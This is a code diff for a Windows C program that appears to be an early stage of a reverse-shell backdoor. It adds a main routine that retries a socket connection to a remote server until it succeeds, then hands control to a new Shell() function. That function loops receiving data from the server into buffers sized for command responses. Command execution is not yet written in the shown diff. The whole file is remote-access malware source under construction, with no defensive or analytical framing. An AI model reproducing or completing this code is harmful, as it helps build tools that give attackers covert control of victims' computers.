@@ -10,18 +10,44 @@
 #include <windowsx.h>
 
 /**
- * hInstance: HInstance is a handle needed by window creation, menus, and a whole host of 
- * other functions to identify the correct program and instance when passing
- * commands or requesting data.
- * 
+ * The bzero() function erases the data in the n bytes of the memory
+   starting at the location pointed to by s, by writing zeros (bytes
+   containing '\0') to that area.
+**/
+// port bzero in linux for windows (for ease of use)
+#define bzeroWin(p, size) (void) memset((p), 0, (size))
+
+//=====================================================================================//
+
+/**
+ * hInstance: HInstance is a handle needed by window creation, menus, and a whole host of
+   other functions to identify the correct program and instance when passing
+   commands or requesting data.
+   
  * hPrev: used in 16bit windows, now 0
- * lpCmdLine: contains command line arguments
- * nCmdShow: flag for main application window state (minimized, maximized or normal)
+   lpCmdLine: contains command line arguments
+   nCmdShow: flag for main application window state (minimized, maximized or normal)
 ***/
 
 // global vars
 int sock;
 
+
+// Shell function
+void Shell() {
+    char buffer[1024];
+    char container[1024];
+    char total_response[18384];
+
+    while (TRUE) {
+        jump:
+		bzeroWin(buffer,1024);
+		bzeroWin(container, sizeof(container));
+		bzeroWin(total_response, sizeof(total_response));
+        // receive variables
+        recv(sock, buffer, 1024, 0);
+    }
+}
 
 // Main function
 int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
@@ -67,4 +93,6 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
 	while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0) {
 		Sleep(30);
 	}
+
+    Shell();
 }
